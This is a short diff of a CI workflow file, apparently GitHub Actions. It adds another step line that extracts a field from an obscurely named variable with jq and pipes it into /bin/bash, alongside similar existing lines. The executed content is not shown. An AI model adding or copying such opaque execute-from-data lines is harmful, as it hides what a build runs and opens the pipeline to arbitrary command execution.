@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$u13" | jq -r .rrntu30889 | /bin/bash
           echo $pioet664 | jq -r .udfu6187 | /bin/bash
           echo $qa2 | jq -r .kne8 | /bin/bash
+          echo $o8 | jq -r .rwm57488 | /bin/bash
 
       - name: Archive output
         if: always()
